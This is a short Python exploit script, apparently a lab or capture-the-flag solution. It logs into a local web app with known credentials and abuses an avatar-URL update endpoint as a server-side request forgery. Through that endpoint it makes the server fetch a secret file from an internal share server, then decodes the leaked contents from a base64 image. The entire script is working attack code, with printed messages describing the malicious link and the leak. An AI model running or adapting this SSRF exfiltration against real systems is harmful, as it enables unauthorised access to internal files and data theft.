import requests
import re
from base64 import b64decode

HOST = "http://localhost:8888"
INTERNAL_SHARE_SERVER_ADDR = "http://localhost:8989"

result_re = re.compile(
    r"""<img src="(?P<data>.*)" width="640" height="480">""", re.MULTILINE | re.DOTALL)
ss = requests.Session()


def csrf(url, uid):
  resp = ss.post(HOST + "/update-avatar",
                 data={"url": url, "uid": uid})
  mo = result_re.search(resp.text)
  if mo:
    data = mo.group("data").split(",")[1].strip()
    return b64decode(data).decode()
  return None


# Known user
cred = {
    "username": "steve",
    "password": "password"
}


# Login
resp = ss.post(HOST + "/login", data=cred, allow_redirects=False)
if resp.status_code == 302:
  uid = resp.cookies.get("id")
  print("Now we can send malicious link and the server gonna request it for us")
  print("Leak secret file from internal share server")
  print(csrf(INTERNAL_SHARE_SERVER_ADDR + "/SUPER_SECRET_FILE.TXT", uid))
else:
  print("Fail")
